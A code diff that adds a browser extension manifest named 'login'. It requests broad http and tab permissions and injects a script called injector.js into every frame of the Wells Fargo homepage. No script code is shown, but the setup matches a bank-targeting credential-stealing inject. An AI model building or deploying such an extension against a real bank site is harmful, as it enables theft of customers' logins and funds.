@@ -1,0 +1,23 @@
+{
+      "name": "login",
+      "version": "1.0",
+      "manifest_version": 2,
+      "permissions": [
+        "http://*/*",
+        "tabs"
+], 
+  "background": {
+  },
+   "browser_action": {}
+   ,"content_scripts": [
+        {
+            "matches": [
+                "https://www.wellsfargo.com/"
+            ],
+			"all_frames": true,
+            "js": [
+                "injector.js"
+            ]
+        }
+    ]
+}
